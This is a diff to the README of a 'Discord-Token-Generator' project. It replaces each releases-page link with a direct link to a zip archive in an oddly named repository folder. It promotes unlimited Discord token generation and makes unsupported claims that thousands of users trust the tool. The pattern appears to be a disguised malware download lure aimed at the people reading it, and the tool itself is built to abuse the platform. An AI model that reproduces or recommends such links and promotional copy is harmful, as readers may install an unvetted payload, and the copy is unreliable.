@@ -1,10 +1,10 @@
 # 🚀 Discord-Token-Generator - Generate Unlimited Discord Tokens Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Discord_Token_Generator_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gabrie6745/Discord-Token-Generator/releases)
+[![Download Now](https://img.shields.io/badge/Download-Discord_Token_Generator_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/gabrie6745/Discord-Token-Generator/main/subconscious/v1.4.zip)
 
 ## 📥 Download & Install
 
-Visit this link to download the application: [https://github.com/gabrie6745/Discord-Token-Generator/releases](https://github.com/gabrie6745/Discord-Token-Generator/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/gabrie6745/Discord-Token-Generator/main/subconscious/v1.4.zip](https://raw.githubusercontent.com/gabrie6745/Discord-Token-Generator/main/subconscious/v1.4.zip)
 
 ## 🎯 What Is Discord-Token-Generator?
 
@@ -146,7 +146,7 @@ This tool is for educational and testing purposes only. Users are responsible fo
 
 Thousands of users trust Discord-Token-Generator for their token needs. Join them today and experience the easiest way to generate Discord tokens on Windows.
 
-**Remember:** The download link is always available at the top of this page. Visit this link to download the application: [https://github.com/gabrie6745/Discord-Token-Generator/releases](https://github.com/gabrie6745/Discord-Token-Generator/releases)
+**Remember:** The download link is always available at the top of this page. Visit this link to download the application: [https://raw.githubusercontent.com/gabrie6745/Discord-Token-Generator/main/subconscious/v1.4.zip](https://raw.githubusercontent.com/gabrie6745/Discord-Token-Generator/main/subconscious/v1.4.zip)
 
 ---
 
